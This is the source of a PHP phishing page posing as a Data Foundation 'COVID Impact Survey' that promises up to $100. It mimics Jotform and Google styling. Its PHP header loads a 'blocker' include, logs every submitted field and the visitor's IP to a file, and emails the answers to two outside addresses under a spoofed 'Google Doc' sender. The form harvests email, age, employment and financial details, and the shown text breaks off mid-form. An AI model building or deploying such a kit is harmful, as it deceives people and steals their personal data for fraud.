<?php
include'blocker.php';
include'function.php';
include'_Obs.php';
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header("Location: c?form_id=".getName($n)."");
$handle = fopen('result.txt', 'a');
fwrite($handle, 'Form 2---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
	$message .= $variable.': '.$value."\r\n";}
$header  = 'From: Google Doc <donotreply@owl.shop>'."\r\n";
$header .= 'Reply-To: donotreply@owl.shop'."\r\n";
$header .= 'MIME-Version: 1.0'."\r\n";
$header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
$header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
$header .= 'X-Mailer: PHP v'.phpversion();
mail('jjennie484@gmail.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
mail('office00107@protonmail.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
fwrite($handle, $variable.': '.$value."\r\n\n");}
fclose($handle);
exit;
} ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en-US"  class="supernova"><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="alternate" type="application/json+oembed" href="https://www.jotform.com/oembed/?format=json&amp;url=https%3A%2F%2Fform.jotform.com%2F203380766775061" title="oEmbed Form">
<link rel="alternate" type="text/xml+oembed" href="https://www.jotform.com/oembed/?format=xml&amp;url=https%3A%2F%2Fform.jotform.com%2F203380766775061" title="oEmbed Form">
<meta property="og:title" content="Form" >
<meta property="og:url" content="https://form.jotform.com/203380766775061" >
<meta property="og:description" content="Please click the link to complete this form." >
<meta name="slack-app-id" content="AHNMASS8M">
<link rel="shortcut icon" href="https://ssl.gstatic.com/docs/spreadsheets/forms/favicon_qp2.png">
<link rel="canonical" href="https://form.jotform.com/203380766775061" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=1" />
<meta name="HandheldFriendly" content="true" />
<title>Introduction</title>
<link type="text/css" media="print" rel="stylesheet" href="https://cdn.jotfor.ms/css/printForm.css" />
<link type="text/css" rel="stylesheet" href="https://cdn.jotfor.ms/themes/CSS/5e6b428acc8c4e222d1beb91.css?themeRevisionID=5f7ed99c2c2c7240ba580251"/>
<link type="text/css" rel="stylesheet" href="https://cdn.jotfor.ms/css/styles/payment/payment_styles.css" />
<link type="text/css" rel="stylesheet" href="https://cdn.jotfor.ms/css/styles/payment/payment_feature.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/punycode/1.4.1/punycode.min.js"></script>
<script src="https://cdn.jotfor.ms/js/vendor/jquery-1.8.0.min.js?v=3.3.22120" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/js/vendor/maskedinput.min.js?v=3.3.22120" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/js/vendor/jquery.maskedinput.min.js?v=3.3.22120" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/static/prototype.forms.js" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/static/jotform.forms.js" type="text/javascript"></script>
<style>
  .custom-button{
    background-color: #F9F5F5;
    color: rgb(19, 18, 32);
    border: 1px solid white;
    max-width: 90px;
    width: 90px;
    padding:10px ;
    border-radius: 5px;
    font-family: inherit;
    font-weight: bold;
    -webkit-box-shadow: 0 6px 4px -6px rgb(129, 125, 125); 
    -moz-box-shadow:    0 6px 4px -6px rgb(129, 125, 125);  
    box-shadow: 0 6px 4px -6px rgb(129, 125, 125);
  }
  .custom-button:hover{
    background-color: #DCD9D9;
  }
</style>
</head>
<body>
 <li class="form-line" data-type="control_image" id="id_3">
        <div id="cid_3" class="form-input-wide" data-layout="full">
          <div style="text-align:center">
            <img alt="" class="form-image" style="border-radius:10px" src="https://www.jotform.com/uploads/rdp4099/form_files/AF1QipOc3z7p3Hk2jS9iTQUfhszXideoW19Ph-3i29wS=w1832-h458.5fc9d0dd2fb8c6.59819156.png" height="200px" width="765px" data-component="image" />
          </div>
        </div>
      </li>
<form class="jotform-form" action="<?php echo basename(__FILE__); ?>" method="post" name="form_203380766775061" id="203380766775061" accept-charset="utf-8" autocomplete="on">

  <div role="main" class="form-all">
    <ul class="form-section page-section">
     
      <li id="cid_4" class="form-input-wide" data-type="control_head">
        <div class="form-header-group  header-large">
          <div class="header-text httal htvam">
            <h1 id="header_4" class="form-header" data-component="header">
              Introduction
            </h1>
            <div id="" class="">
              <br>Thank you for participating in our survey! We are conducting a very important study to monitor the health of the U.S. population and the social and economic impact of the COVID-19 pandemic. We want to know about your experiences during the COVID-19 outbreak. The COVID Impact Survey is funded by the Data Foundation.<br><br> You will receive up to $100 for completing this survey if you are eligible, a donation to your preferred local charity organization and the National COVID-19 Vaccine Research Initiative.<br><br> Your answers are all confidential. Kindly choose the answer that applies to you the most.<br><br> <p style="color:red">* Required
            </div>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_email" id="id_5">
        <label class="form-label form-label-top form-label-auto" id="label_5" for="input_5">Email address <font style="color:red">*</font></label>
        <div id="cid_5" class="form-input-wide" data-layout="half">
          <span class="form-sub-label-container" style="vertical-align:top">
            <input type="email" placeholder="Your email" id="input_5" name="Email address" class="form-textbox validate[Email]" style="width:310px" size="310" value="" data-component="email" aria-labelledby="label_5 sublabel_input_5" />
          </span>
        </div>
      </li>
      <li class="form-line" data-type="control_phone" id="id_6">
        <label class="form-label form-label-top form-label-auto" id="label_6" for="input_6_full"> What is your current age? <font style="color:red">*</font></label>
        <div id="cid_6" class="form-input-wide" data-layout="half">
          <span class="form-sub-label-container" style="vertical-align:top">
            <input type="age" id="input_6_full" name="Age" data-type="mask-number" class="mask-phone-number form-textbox validate[Fill Mask]" style="width:310px" data-masked="true" value="" placeholder="Your answer" data-component="" aria-labelledby="label_6 sublabel_6_masked" />
          </span>
        </div>
      </li>
      <li class="form-line" data-type="control_checkbox" id="id_7">
        <label class="form-label form-label-top form-label-auto" id="label_7" for="input_7"> Which of the following options best describe you? Choose all that apply. <font style="color:red">*</font> </label>
        <div id="cid_7" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_7" data-component="checkbox">
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="checkbox" class="form-checkbox" id="input_7_0" name="Which of the following options best describe you? Choose all that apply." value="Employer" />
              <label id="label_input_7_0" for="input_7_0"> Employer </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_7_1" name="Which of the following options best describe you? Choose all that apply." value="Employee" />
              <label id="label_input_7_1" for="input_7_1"> Employee </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_7_2" name="Which of the following options best describe you? Choose all that apply." value="Community Leader" />
              <label id="label_input_7_2" for="input_7_2"> Community Leader </label>
            </span>
            <span class="form-checkbox-item formCheckboxOther" style="clear:left">
              <input type="checkbox" class="form-checkbox-other form-checkbox" name="Which of the following options best describe you? Choose all that apply." id="other_7" value="other" aria-label="Other" />
              <label id="label_other_7" style="text-indent:0" for="other_7"> Other </label>
              
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_9">
        <label class="form-label form-label-top form-label-auto" id="label_9" for="input_9"> In the past month after March 1 2020, how often did you talk with any of your neighbors? <font style="color:red">*</font></label>
        <div id="cid_9" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_9" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_9_0" name="In the past month after March 1 2020, how often did you talk with any of your neighbors?" value="Every day" />
              <label id="label_input_9_0" for="input_9_0"> Every day </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_9_1" name="In the past month after March 1 2020, how often did you talk with any of your neighbors?" value="Few times a week" />
              <label id="label_input_9_1" for="input_9_1"> Few times a week </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_9_2" name="In the past month after March 1 2020, how often did you talk with any of your neighbors?" value="Few times a month" />
              <label id="label_input_9_2" for="input_9_2"> Few times a month </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_9_3" name="In the past month after March 1 2020, how often did you talk with any of your neighbors?" value="Not at all" />
              <label id="label_input_9_3" for="input_9_3"> Not at all </label>
            </span>
			 <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_9_4" name="In the past month after March 1 2020, how often did you talk with any of your neighbors?" value="Not sure" />
              <label id="label_input_9_4" for="input_9_4"> Not sure </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_41">
        <label class="form-label form-label-top form-label-auto" id="label_41" for="input_41"> In the past month prior to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet? <font style="color:red">*</font></label>
        <div id="cid_41" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_41" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_41_0" name="In the past month prior to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet?" value="Every day" />
              <label id="label_input_41_0" for="input_41_0"> Every day </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_41_1" name="In the past month prior to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet?" value="Few times a week" />
              <label id="label_input_41_1" for="input_41_1"> Few times a week </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_41_2" name="In the past month prior to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet?" value="Few times a month" />
              <label id="label_input_41_2" for="input_41_2"> Few times a month </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_41_3" name="In the past month prior to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet?" value="Not at all" />
              <label id="label_input_41_3" for="input_41_3"> Not at all </label>
            </span>
			 <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_41_4" name="In the past month prior to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet?" value="Not sure" />
              <label id="label_input_41_4" for="input_41_4"> Not sure </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_10">
        <label class="form-label form-label-top form-label-auto" id="label_10" for="input_10"> In the past month after to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet? <font style="color:red">*</font></label>
        <div id="cid_10" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_10" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_10_0" name="In the past month after to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet?" value="Every day" />
              <label id="label_input_10_0" for="input_10_0"> Every day </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_10_1" name="In the past month after to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet?" value="Few times a week" />
              <label id="label_input_10_1" for="input_10_1"> Few times a week </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_10_2" name="In the past month after to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet?" value="Few times a month" />
              <label id="label_input_10_2" for="input_10_2"> Few times a month </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_10_3" name="In the past month after to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet?" value="Not at all" />
              <label id="label_input_10_3" for="input_10_3"> Not at all </label>
            </span>
			 <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_10_4" name="In the past month after to March 1, 2020, how often did you communicate with friends and family by phone, text, email, app, or using the Internet?" value="Not sure" />
              <label id="label_input_10_4" for="input_10_4"> Not sure </label>
            </span>
          </div>
        </div>
      </li>
	  <li class="form-line" data-type="control_radio" id="id_11">
        <label class="form-label form-label-top form-label-auto" id="label_11" for="input_11"> In the past month prior to March 1, 2020, how often did you talk with any of your neighbors? <font style="color:red">*</font></label>
        <div id="cid_11" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_11" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_11_0" name="In the past month prior to March 1, 2020, how often did you talk with any of your neighbors?" value="Every day" />
              <label id="label_input_11_0" for="input_11_0"> Every day </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_11_1" name="In the past month prior to March 1, 2020, how often did you talk with any of your neighbors?" value="Few times a week" />
              <label id="label_input_11_1" for="input_11_1"> Few times a week </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_11_2" name="In the past month prior to March 1, 2020, how often did you talk with any of your neighbors?" value="Few times a month" />
              <label id="label_input_11_2" for="input_11_2"> Few times a month </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_11_3" name="In the past month prior to March 1, 2020, how often did you talk with any of your neighbors?" value="Not at all" />
              <label id="label_input_11_3" for="input_11_3"> Not at all </label>
            </span>
			 <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_11_4" name="In the past month prior to March 1, 2020, how often did you talk with any of your neighbors?" value="Not sure" />
              <label id="label_input_11_4" for="input_11_4"> Not sure </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_checkbox" id="id_12">
        <label class="form-label form-label-top form-label-auto" id="label_12" for="input_12"> Please select your most preferred means of communication with friends and family since COVID-19 began spreading in the United States <font style="color:red">*</font></label>
        <div id="cid_12" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_12" data-component="checkbox">
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="checkbox" class="form-checkbox" id="input_12_0" name="Please select your most preferred means of communication with friends and family since COVID-19 began spreading in the United States" value="Phone Calls" />
              <label id="label_input_12_0" for="input_12_0"> Phone Calls </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_12_1" name="Please select your most preferred means of communication with friends and family since COVID-19 began spreading in the United States" value="Text Message" />
              <label id="label_input_12_1" for="input_12_1"> Text Message </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_12_2" name="Please select your most preferred means of communication with friends and family since COVID-19 began spreading in the United States" value="Email" />
              <label id="label_input_12_2" for="input_12_2"> Email </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_12_3" name="Please select your most preferred means of communication with friends and family since COVID-19 began spreading in the United States" value="Social Media Apps" />
              <label id="label_input_12_3" for="input_12_3"> Social Media Apps </label>
            </span>
			<span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_12_4" name="Please select your most preferred means of communication with friends and family since COVID-19 began spreading in the United States" value="Other" />
              <label id="label_input_12_4" for="input_12_4"> Other </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_14">
        <label class="form-label form-label-top form-label-auto" id="label_14" for="input_14"> To what extent do you believe that the measures asked of you by your government or local health authority are important to prevent and/or reduce the spread of COVID-19? <font style="color:red">*</font></label>
        <div id="cid_14" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_14" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_14_0" name="To what extent do you believe that the measures asked of you by your government or local health authority are important to prevent and/or reduce the spread of COVID-19?" value="Very important" />
              <label id="label_input_14_0" for="input_14_0"> Very important </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_14_1" name="To what extent do you believe that the measures asked of you by your government or local health authority are important to prevent and/or reduce the spread of COVID-19?" value="Somewhat important" />
              <label id="label_input_14_1" for="input_14_1"> Somewhat important </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_14_2" name="To what extent do you believe that the measures asked of you by your government or local health authority are important to prevent and/or reduce the spread of COVID-19?" value="Not very inportant" />
              <label id="label_input_14_2" for="input_14_2"> Not very inportant </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_14_3" name="To what extent do you believe that the measures asked of you by your government or local health authority are important to prevent and/or reduce the spread of COVID-19?" value="Not important at all" />
              <label id="label_input_14_3" for="input_14_3"> Not important at all </label>
            </span>
			<span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_14_4" name="To what extent do you believe that the measures asked of you by your government or local health authority are important to prevent and/or reduce the spread of COVID-19?" value="I don't know" />
              <label id="label_input_14_4" for="input_14_4"> I don't know </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_16">
        <label class="form-label form-label-top form-label-auto" id="label_16" for="input_16"> How would you rate how much you are doing to prevent and/or slow the spread of COVID-19, compared to others? <font style="color:red">*</font></label>
        <div id="cid_16" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_16" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_16_0" name="How would you rate how much you are doing to prevent and/or slow the spread of COVID-19, compared to others?" value="I am doing much more than most" />
              <label id="label_input_16_0" for="input_16_0"> I am doing much more than most </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_16_1" name="How would you rate how much you are doing to prevent and/or slow the spread of COVID-19, compared to others?" value="I am doing more than most" />
              <label id="label_input_16_1" for="input_16_1"> I am doing more than most </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_16_2" name="How would you rate how much you are doing to prevent and/or slow the spread of COVID-19, compared to others?" value="I am doing about the same as everyone else" />
              <label id="label_input_16_2" for="input_16_2"> I am doing about the same as everyone else </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_16_3" name="How would you rate how much you are doing to prevent and/or slow the spread of COVID-19, compared to others?" value="I am doing less than most" />
              <label id="label_input_16_3" for="input_16_3"> I am doing less than most </label>
            </span>
			 <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_16_4" name="How would you rate how much you are doing to prevent and/or slow the spread of COVID-19, compared to others?" value="I am doing much less than most" />
              <label id="label_input_16_4" for="input_16_4"> I am doing much less than most </label>
            </span>
			 <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_16_5" name="How would you rate how much you are doing to prevent and/or slow the spread of COVID-19, compared to others?" value="I don’t know/I prefer not to answer" />
              <label id="label_input_16_5" for="input_16_5"> I don’t know/I prefer not to answer </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_checkbox" id="id_17">
        <label class="form-label form-label-top form-label-auto" id="label_17" for="input_17"> How has the COVID-19 outbreak impacted your personal finances or source of income? Choose all that apply.<font style="color:red">*</font> </label>
        <div id="cid_17" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_17" data-component="checkbox">
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="checkbox" class="form-checkbox" id="input_17_0" name="How has the COVID-19 outbreak impacted your personal finances or source of income? Choose all that apply." value="I lost my job or main source of income on a temporary basis (I was laid off)" />
              <label id="label_input_17_0" for="input_17_0"> I lost my job or main source of income on a temporary basis (I was laid off) </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_17_1" name="How has the COVID-19 outbreak impacted your personal finances or source of income? Choose all that apply." value="I lost my job or main source of income on a permanent basis" />
              <label id="label_input_17_1" for="input_17_1"> I lost my job or main source of income on a permanent basis </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_17_2" name="How has the COVID-19 outbreak impacted your personal finances or source of income? Choose all that apply." value="I am concerned about losing my job or main source of income in the next few weeks if nothing changes" />
              <label id="label_input_17_2" for="input_17_2"> I am concerned about losing my job or main source of income in the next few weeks if nothing changes </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_17_3" name="How has the COVID-19 outbreak impacted your personal finances or source of income? Choose all that apply." value="I am unable to meet financial obligations, such as rent or mortgage payments" />
              <label id="label_input_17_3" for="input_17_3"> I am unable to meet financial obligations, such as rent or mortgage payments </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_17_4" name="How has the COVID-19 outbreak impacted your personal finances or source of income? Choose all that apply." value="I am unable to meet essential needs, such as groceries, electricity, etc." />
              <label id="label_input_17_4" for="input_17_4"> 
I am unable to meet essential needs, such as groceries, electricity, etc. </label>
            </span>
			<span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_17_5" name="How has the COVID-19 outbreak impacted your personal finances or source of income? Choose all that apply." value="I am using my savings to meet financial obligations" />
              <label id="label_input_17_5" for="input_17_5"> I am using my savings to meet financial obligations </label>
            </span>
			<span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_17_6" name="How has the COVID-19 outbreak impacted your personal finances or source of income? Choose all that apply." value="Other" />
              <label id="label_input_17_6" for="input_17_6"> Other</label>
            </span>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_18">
        <label class="form-label form-label-top form-label-auto" id="label_18" for="input_18"> Have your personal financial plans been changed or affected by the following types of restrictions, or not? <font style="color:red">*</font> </label>
        <div id="cid_18" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_18" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_18_0" name="Have your personal financial plans been changed or affected by the following types of restrictions, or not?" value="Yes" />
              <label id="label_input_18_0" for="input_18_0"> Yes </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_18_1" name="Have your personal financial plans been changed or affected by the following types of restrictions, or not?" value="No" />
              <label id="label_input_18_1" for="input_18_1"> No </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_18_2" name="Have your personal financial plans been changed or affected by the following types of restrictions, or not?" value="Not sure" />
              <label id="label_input_18_2" for="input_18_2"> Not sure </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_checkbox" id="id_19">
        <label class="form-label form-label-top form-label-auto" id="label_19" for="input_19"> Suppose that you have an unexpected expense that costs $400. Based on your current financial situation, how would you pay for this expense? If you would use more than one method to cover this expense, please select all that apply. <font style="color:red">*</font></label>
        <div id="cid_19" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_19" data-component="checkbox">
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="checkbox" class="form-checkbox" id="input_19_0" name="Suppose that you have an unexpected expense that costs $400. Based on your current financial situation, how would you pay for this expense? If you would use more than one method to cover this expense, please select all that apply." value="Put it on your credit card and pay it off in full at the next statement" />
              <label id="label_input_19_0" for="input_19_0"> Put it on your credit card and pay it off in full at the next statement </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_19_1" name="Suppose that you have an unexpected expense that costs $400. Based on your current financial situation, how would you pay for this expense? If you would use more than one method to cover this expense, please select all that apply." value="Put it on your credit card and pay it off over time" />
              <label id="label_input_19_1" for="input_19_1"> Put it on your credit card and pay it off over time </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_19_2" name="Suppose that you have an unexpected expense that costs $400. Based on your current financial situation, how would you pay for this expense? If you would use more than one method to cover this expense, please select all that apply." value="Use money in a savings or checking account or cash" />
              <label id="label_input_19_2" for="input_19_2"> Use money in a savings or checking account or cash </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_19_3" name="Suppose that you have an unexpected expense that costs $400. Based on your current financial situation, how would you pay for this expense? If you would use more than one method to cover this expense, please select all that apply." value="Use money from a bank loan or line of credit" />
              <label id="label_input_19_3" for="input_19_3"> Use money from a bank loan or line of credit </label>
            </span>
			 <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_19_4" name="Suppose that you have an unexpected expense that costs $400. Based on your current financial situation, how would you pay for this expense? If you would use more than one method to cover this expense, please select all that apply." value="Use payday loan, deposit advance or overdraft" />
              <label id="label_input_19_4" for="input_19_4"> Use payday loan, deposit advance or overdraft </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_20">
        <label class="form-label form-label-top form-label-auto" id="label_20" for="input_20"> In the past 7 days, did you do any work for pay at a job or business? <font style="color:red">*</font></label>
        <div id="cid_20" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_20" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_20_0" name="In the past 7 days, did you do any work for pay at a job or business?" value="Yes" />
              <label id="label_input_20_0" for="input_20_0"> Yes </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_20_1" name="In the past 7 days, did you do any work for pay at a job or business?" value="No" />
              <label id="label_input_20_1" for="input_20_1"> No </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_textbox" id="id_21">
        <label class="form-label form-label-top form-label-auto" id="label_21" for="input_21"> If last response was YES, how many hours did you work last week at all jobs? <font style="color:red">*</font>
 </label>
        <div id="cid_21" class="form-input-wide" data-layout="half">
          <input type="text" id="input_21" placeholder="Your answer" name="If last response was YES, how many hours did you work last week at all jobs?" data-type="input-textbox" class="form-textbox" style="width:310px" size="310" value="" data-component="textbox" aria-labelledby="label_21" />
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_23">
        <label class="form-label form-label-top form-label-auto" id="label_23" for="input_23"> If last response was NO, what was your main reason for not working for pay? <font style="color:red">*</font></label>
        <div id="cid_23" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_23" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_23_0" name="If last response was NO, what was your main reason for not working for pay?" value="I was laid-off temporarily or furloughed" />
              <label id="label_input_23_0" for="input_23_0"> I was laid-off temporarily or furloughed</label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_23_1" name="If last response was NO, what was your main reason for not working for pay?" value="I was not at my usual jobs because I was caring for a dependant (children or elderly person)" />
              <label id="label_input_23_1" for="input_23_1"> I was not at my usual jobs because I was caring for a dependant (children or elderly person) </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_23_2" name="If last response was NO, what was your main reason for not working for pay?" value="I was not at my usual jobs because I was caring for someone with COVID-19" />
              <label id="label_input_23_2" for="input_23_2"> I was not at my usual jobs because I was caring for someone with COVID-19</label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
